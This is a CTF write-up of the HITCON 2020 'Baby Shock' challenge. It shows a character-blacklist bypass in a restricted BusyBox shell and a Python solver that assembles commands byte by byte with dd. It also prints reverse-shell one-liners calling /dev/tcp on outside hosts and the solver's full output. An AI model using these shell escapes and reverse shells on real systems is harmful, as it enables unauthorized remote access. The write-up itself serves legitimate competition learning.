# Baby Shock

**Category**: Misc \
**Author**: ??? \
**Solves**: 63 teams \
**Points**: 201

## Challenge

```
nc 54.248.135.16 1986
```

## Solution

This problem took me about 7 hours to solve and it was the only one I was able
to solve during this CTF. Full disclosure: compared to
[solutions from other teams](https://github.com/FrenchRoomba/ctf-writeup-HITCON-CTF-2020/tree/master/baby-shock),
mine is pretty awful. Here goes:

```
$ nc 54.248.135.16 1986
connected!
welcome to Baby shock, doo, doo, doo, doo, doo, doo!!!
> help
> Available Commands:
pwd ls mkdir netstat sort printf exit help id mount df du find history touch
> pwd
> /hitcon/<my_ip>
> mkdir
> BusyBox v1.27.2 (Ubuntu 1:1.27.2-2ubuntu3.3) multi-call binary.

Usage: mkdir [OPTIONS] DIRECTORY...

Create DIRECTORY

        -m MODE Mode
        -p      No error if exists; make parent directories as needed
> printf hi
> hi
> ls /
> bad command: ls /
> printf /
> bad command: printf /
> ls -l
> bad command: ls -l
> printf -
> bad command: printf -
```

As you can see, we seem to be in a restricted BusyBox shell with a limited set
of commands available. Also, it seems that we aren't allowed to use characters
like `/` and `-`, which is a bit frustrating. By running `printf <char>`, we
can test to see whether `<char>` is blacklisted or not.

After some testing, I found that these were blacklisted:
```
$ { } [ ] - \ / < > | " ' * ? ! @ &
```

And these were allowed:
```
; : ( ) = + # % ~
```

Also, interestingly enough, commands with more than one `.` would fail.

From this we can see that:
- We can't easily inspect parent directions because `/` and `..` are blacklisted
- We can't supply options to commands because `-` is blacklisted
- Writing files is difficult because redirection (`>`) and piping (`|`) are
  disallowed

After playing around with the shell for a few hours, I eventually found something interesting:
```
> pwd ; echo hi
> /hitcon/<my_ip>
hi
```

Wait what? I thought `echo` wasn't included in the list of allowed commands! As
it turns out, as long as we run a whitelisted command first, we can run any
command we want after the semicolon, like `echo`, `cat`, `nc`, `perl`,
`python3`, `vim`. However, the blacklist of special characters still prevents us
from doing anything meaningful.

Despite the initial excitement, I was stuck here for a long time. After a while,
I randomly decided to run `pwd ; ps` and got this:

```
> pwd ; ps
> /hitcon/<my_ip>
PID   USER     COMMAND
    1 root     {systemd} /sbin/init
    2 root     [kthreadd]
...
13497 orange   /lib/systemd/systemd --user    <-- CTF admins logged in here
13509 orange   (sd-pam)
13671 orange   {screen} SCREEN
13672 orange   /bin/bash
13732 root     sudo su
13733 root     su
13734 root     bash
14241 cb520    /lib/systemd/systemd --user
14242 cb520    (sd-pam)
24508 cb520    sshd: cb520@pts/4
24509 cb520    -bash
24524 root     sudo su -
24526 root     su -
24527 root     {bash} -su
...
16406 1128     /bin/sh -c busybox sh
16409 1128     busybox sh
16426 1128     {exe} sh index.html                             <- 🤔
16427 1128     bash -c bash -i >& /dev/tcp/p6.is/4444 0>&1     <- 🤔
16429 1128     bash -i
19281 1128     /bin/sh -c busybox sh
19288 1128     busybox sh
19864 1128     bash in12
19865 1128     /bin/bash -i
20201 1128     /bin/sh -c busybox sh
20202 1128     busybox sh
20326 root     [kworker/0:2-cgr]
20365 1128     python3 -c import pty; pty.spawn("/bin/bash")   <- 🤔
23368 1128     vim                                             <- 🤔
24865 1128     python3 /babyshock2020.py
24866 1128     /bin/sh -c busybox sh
25564 1128     python3 /babyshock2020.py
25565 1128     /bin/sh -c busybox sh
25566 1128     busybox sh
25575 1128     bash
...
25868 1128     {exe} ps
```

We can actually a see a few reverse shells from other teams still running! For
example, we can see the reverse shell of [posix](https://p6.is/) from
[The Flat Network Society](https://github.com/TFNS/) here:
```
bash -c bash -i >& /dev/tcp/p6.is/4444 0>&1
```

But how were they able to use blacklisted characters like `- > & /`?
Then I saw this line:
```
sh index.html
```

What if we put a bash script at some `domain.com`, download it, and then execute
it? That would allow us to bypass the blacklist. To test it, I ran this:
```
> pwd ; wget google.com
> /hitcon/<my_ip>
Connecting to google.com (216.58.197.174:80)
Connecting to www.google.com (216.58.220.100:80)
index.html           100% |*******************************| 14037   0:00:00 ETA
> pwd ; file index.html
> /hitcon/<my_ip>
index.html: HTML document, ASCII text, with very long lines
> pwd ; bash index.html
> /hitcon/<my_ip>
index.html: line 1: syntax error near unexpected token `<'   <-- Expected, since it's just HTML right now
```

Great, downloading and executing a file looks like it will work. Now we just
need put a bash script on a server that can be reached from the shell. However,
when I tried to few different servers, I got this:
```
> pwd ; wget 12.345.67.89
> bad command: pwd ; wget 12.345.67.89       <-- Multiple periods in one command not allowed
> pwd ; images.google.com
> bad command: pwd ; wget images.google.com  <-- Multiple periods
> pwd ; wget google.com/test
> bad command: pwd ; wget google.com/test    <-- Slash not allowed
```

So subdomains and subdirectories are a no-go. We actually need a full domain
like `google.com` or `hitcon.org`. I asked around on my team, but nobody owned a
domain that I could use.

I was stumped here for a while before I came up with a stupid idea:
- Download some HTML page like `hitcon.org`
- Since it's HTML, it'll contain characters like `- / < >`
- Use `dd` to copy the desired characters one-by-one into a bash script
- Execute the script

At this point I was vaguely aware that I was stumbling upon an extremely
roundabout solution and that the intended solution was probably much simpler.
But I didn't have the creativity nor the experience to come up with it, so
I continued on. It took me several hours, but I eventually came up with a working
solution:

```python
import pwn
import sys
import subprocess
import os.path

assert len(sys.argv) >= 2
cmd = sys.argv[1]  # The command we want to execute (will be saved to file)

url = 'hitcon.org'
wget = 'wget {}'.format(url)

if os.path.isfile('index.html'):
    os.remove('index.html')

print(subprocess.check_output(wget, shell=True).decode())

# Need to split into bytes to ensure multi-byte chars are handled correctly
fin = bytearray(open('index.html').read().encode())

payloads = [
    'pwd ; rm index.html',
    'pwd ; rm payload',
    'pwd ; {}'.format(wget)
]

# bs=1 -> blocksize = 1 byte
# count=1 -> transfer 1 block
# skip -> offset of the input file to read from
# seek -> offset of the output file to write to
fstr = 'pwd ; dd if=index.html of=payload bs=1 count=1 skip={} seek={}'

for i, c in enumerate(cmd):
    pos = fin.find(c.encode())
    if pos == -1:
        raise ValueError('char `{}` not found'.format(c))
    payloads.append(fstr.format(pos, i))

payloads.append('pwd ; bash payload')

p = '\n'.join(payloads)
print(p)

if len(sys.argv) >= 3:
    io = pwn.remote('54.248.135.16', 1986)
    io.sendline(p)
    print(io.recvallS(timeout=2))
else:
    print(subprocess.check_output(p, shell=True).decode())
```

Output:
```
$ python3 solve.py "ls -l /" remote
--2020-11-29 16:12:17--  http://hitcon.org/
Resolving hitcon.org (hitcon.org)... 104.27.174.104, 104.27.175.104, 172.67.200.105, ...
Connecting to hitcon.org (hitcon.org)|104.27.174.104|:80... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://hitcon.org/2020/ [following]
--2020-11-29 16:12:17--  https://hitcon.org/2020/
Connecting to hitcon.org (hitcon.org)|104.27.174.104|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘index.html’

index.html                                          [ <=>                                                                                                 ]  11.97K  --.-KB/s    in 0.002s

2020-11-29 16:12:17 (6.29 MB/s) - ‘index.html’ saved [12253]


pwd ; rm index.html
pwd ; rm payload
pwd ; wget hitcon.org
pwd ; dd if=index.html of=payload bs=1 count=1 skip=13 seek=0
pwd ; dd if=index.html of=payload bs=1 count=1 skip=59 seek=1
pwd ; dd if=index.html of=payload bs=1 count=1 skip=9 seek=2
pwd ; dd if=index.html of=payload bs=1 count=1 skip=30 seek=3
pwd ; dd if=index.html of=payload bs=1 count=1 skip=13 seek=4
pwd ; dd if=index.html of=payload bs=1 count=1 skip=9 seek=5
pwd ; dd if=index.html of=payload bs=1 count=1 skip=167 seek=6
pwd ; bash payload
[+] Opening connection to 54.248.135.16 on port 1986: Done
[+] Receiving all data: Done (2.64KB)
[*] Closed connection to 54.248.135.16 port 1986
connected!
welcome to Baby shock, doo, doo, doo, doo, doo, doo!!!
> > > > > > > > > > > > > > > > > > > > > > > /hitcon/75.188.17.80
/hitcon/75.188.17.80
/hitcon/75.188.17.80
Connecting to hitcon.org (104.27.174.104:80)
Connecting to hitcon.org (172.67.200.105:443)
index.html           100% |*******************************| 12253   0:00:00 ETA

/hitcon/75.188.17.80
1+0 records in
1+0 records out
/hitcon/75.188.17.80
1+0 records in
1+0 records out
/hitcon/75.188.17.80
1+0 records in
1+0 records out
/hitcon/75.188.17.80
1+0 records in
1+0 records out
/hitcon/75.188.17.80
1+0 records in
1+0 records out
/hitcon/75.188.17.80
1+0 records in
1+0 records out
/hitcon/75.188.17.80
1+0 records in
1+0 records out
/hitcon/75.188.17.80
total 4194516
-rwx------    1 root root       2538 Nov 28 08:10 babyshock2020.py
-rwx------    1 root root       2496 Nov 28 08:09 babyshock2020.py~
drwxr-xr-x    2 root root       4096 Oct 26 17:27 bin
drwxr-xr-x    3 root root       4096 Oct 26 17:32 boot
drwxr-xr-x   15 root root       3120 Nov 28 21:49 dev
drwxr-xr-x   90 root root       4096 Nov 28 06:36 etc
-r--------    1 root root         32 Nov 28 05:10 flag
d-wx-wx-wt    3 root root      61440 Nov 29 20:56 history
d-wx-wx-wt 1103 root root      36864 Nov 29 20:56 hitcon
drwxr-xr-x    5 root root       4096 Nov 28 04:47 home
lrwxrwxrwx    1 root root         30 Oct 26 17:32 initrd.img -> boot/initrd.img-5.4.0-1029-aws
lrwxrwxrwx    1 root root         30 Oct 26 17:32 initrd.img.old -> boot/initrd.img-5.4.0-1029-aws
drwxr-xr-x   20 root root       4096 Nov 28 05:11 lib
drwxr-xr-x    2 root root       4096 Nov 28 05:11 lib64
drwx------    2 root root      16384 Oct 26 17:29 lost+found
drwxr-xr-x    2 root root       4096 Oct 26 17:24 media
drwxr-xr-x    2 root root       4096 Oct 26 17:24 mnt
drwxr-xr-x    2 root root       4096 Oct 26 17:24 opt
dr-xr-xr-x  132 root root          0 Nov 28 21:49 proc
-rwsr-sr-x    1 root root       8440 Nov 28 05:11 readflag
drwx------    6 root root       4096 Nov 28 15:02 root
drwxr-xr-x   24 root root        900 Nov 29 09:23 run
drwxr-xr-x    2 root root       4096 Oct 26 17:27 sbin
drwxr-xr-x    6 root root       4096 Nov 28 13:40 snap
drwxr-xr-x    2 root root       4096 Oct 26 17:24 srv
-rw-------    1 root root 4294967296 Nov 29 06:30 swap
dr-xr-xr-x   13 root root          0 Nov 28 21:49 sys
drwxrwxrwt   12 root root       4096 Nov 29 19:27 tmp
drwxr-xr-x   10 root root       4096 Oct 26 17:24 usr
drwxr-xr-x   13 root root       4096 Oct 26 17:27 var
lrwxrwxrwx    1 root root         27 Oct 26 17:32 vmlinuz -> boot/vmlinuz-5.4.0-1029-aws
lrwxrwxrwx    1 root root         27 Oct 26 17:32 vmlinuz.old -> boot/vmlinuz-5.4.0-1029-aws
```

We're most interested in these two entries:
```
-r--------    1 root root         32 Nov 28 05:10 flag
-rwsr-sr-x    1 root root       8440 Nov 28 05:11 readflag
```

`readflag` has the SUID and SGID bit set, so running it should give us the flag.
Now all we have to do is run the script again to execute it:
```
$ python3 solve.py "/readflag" remote
--2020-11-29 16:12:59--  http://hitcon.org/
Resolving hitcon.org (hitcon.org)... 172.67.200.105, 104.27.175.104, 104.27.174.104, ...
Connecting to hitcon.org (hitcon.org)|172.67.200.105|:80... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://hitcon.org/2020/ [following]
--2020-11-29 16:13:00--  https://hitcon.org/2020/
Connecting to hitcon.org (hitcon.org)|172.67.200.105|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘index.html’

index.html                                          [ <=>                                                                                                 ]  12.13K  --.-KB/s    in 0.001s

2020-11-29 16:13:00 (16.4 MB/s) - ‘index.html’ saved [12417]


pwd ; rm index.html
pwd ; rm payload
pwd ; wget hitcon.org
pwd ; dd if=index.html of=payload bs=1 count=1 skip=167 seek=0
pwd ; dd if=index.html of=payload bs=1 count=1 skip=58 seek=1
pwd ; dd if=index.html of=payload bs=1 count=1 skip=40 seek=2
pwd ; dd if=index.html of=payload bs=1 count=1 skip=23 seek=3
pwd ; dd if=index.html of=payload bs=1 count=1 skip=42 seek=4
pwd ; dd if=index.html of=payload bs=1 count=1 skip=66 seek=5
pwd ; dd if=index.html of=payload bs=1 count=1 skip=13 seek=6
pwd ; dd if=index.html of=payload bs=1 count=1 skip=23 seek=7
pwd ; dd if=index.html of=payload bs=1 count=1 skip=25 seek=8
pwd ; bash payload
[+] Opening connection to 54.248.135.16 on port 1986: Done
[+] Receiving all data: Done (889B)
[*] Closed connection to 54.248.135.16 port 1986
connected!
welcome to Baby shock, doo, doo, doo, doo, doo, doo!!!
> > > > > > > > > > > > > > > > > > > > > > /hitcon/75.188.17.80
> > > > > /hitcon/75.188.17.80
/hitcon/75.188.17.80
Connecting to hitcon.org (172.67.200.105:80)
Connecting to hitcon.org (172.67.200.105:443)
index.html           100% |*******************************| 12253   0:00:00 ETA

/hitcon/75.188.17.80
1+0 records in
1+0 records out
/hitcon/75.188.17.80
1+0 records in
1+0 records out
/hitcon/75.188.17.80
1+0 records in
1+0 records out
/hitcon/75.188.17.80
1+0 records in
1+0 records out
/hitcon/75.188.17.80
1+0 records in
1+0 records out
/hitcon/75.188.17.80
1+0 records in
1+0 records out
/hitcon/75.188.17.80
1+0 records in
1+0 records out
/hitcon/75.188.17.80
1+0 records in
1+0 records out
/hitcon/75.188.17.80
1+0 records in
1+0 records out
/hitcon/75.188.17.80
hitcon{i_Am_s0_m155_s3e11sh0ck}
```

Alternatively, you can spawn a reverse shell by port-forwarding `6666` and running:
```
$ nc -lvp 6666
$ python3 solve.py "bash -i >& /dev/tcp/75.188.17.80/6666 0>&1" remote
```

Ouput:
```
$ nc -lvp 6666
Listening on [0.0.0.0] (family 0, port 6666)
Connection from ec2-54-248-135-16.ap-northeast-1.compute.amazonaws.com 35300 received!
bash: cannot set terminal process group (11065): Inappropriate ioctl for device
bash: no job control in this shell
groups: cannot find name for group ID 2020
I have no name!@ip-172-31-11-96:/$ ./readflag
./readflag
hitcon{i_Am_s0_m155_s3e11sh0ck}
I have no name!@ip-172-31-11-96:/$
```

Thanks HITCON for the fun challenge!
